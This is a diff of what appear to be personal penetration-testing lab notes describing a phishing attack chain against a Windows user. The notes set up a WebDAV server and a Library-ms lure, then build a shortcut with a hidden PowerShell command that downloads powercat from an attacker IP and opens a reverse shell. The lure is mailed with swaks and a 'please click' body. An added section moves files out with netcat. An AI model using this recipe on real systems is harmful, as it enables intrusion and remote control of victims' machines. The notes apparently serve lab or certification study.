@@ -9,7 +9,6 @@ pip3 install cheroot
 mkdir webdav
 sudo wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root webdav/
 ```
-
 ### 2) Create 'config.Library.ms'
 ```
 <?xml version="1.0" encoding="UTF-8"?>
@@ -32,7 +31,6 @@ sudo wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root webdav/
 </searchConnectorDescriptionList>
 </libraryDescription>
 ```
-
 ### 3) Create lnk file (in WINDOWS) with PS payload (powercat)
 ```
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -ep bypass -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.155/powercat.ps1');powercat -c 192.168.45.155 -p 443 -e powershell"
@@ -40,7 +38,6 @@ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -ep bypass -
 # Powercat
 https://github.com/besimorhino/powercat/blob/master/powercat.ps1
 ```
-
 ### 4) Staging 
 - Place `powercat.ps1`, `shortcut.lnk`, `config.Library.ms` & `body.txt` in **/Webdav**
 - nc -lnvp 1337 (from **/WebDav** to get `powercat.ps1`) <-- this is wrong
@@ -51,7 +48,6 @@ https://github.com/besimorhino/powercat/blob/master/powercat.ps1
 
  please click on the attachment
 ```
-
 ### 5) Execution (require mail credentials)
 
 > jim@relia -> has to be legit recipient
@@ -59,5 +55,11 @@ https://github.com/besimorhino/powercat/blob/master/powercat.ps1
 swaks -t jim@relia.com --from test@relia.com --attach @config.Library-ms --server 192.168.186.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 ```
 
+# 🔹Transfer files (Windows to Linux)
+```
+# Windows TO
+PS C:\temp> cmd /c "nc64.exe 192.168.174.245 4444 < C:\Scheduler\scheduler.exe"
 
-
+# Linux
+nc -lnvp 4444 > scheduler.exe
+```
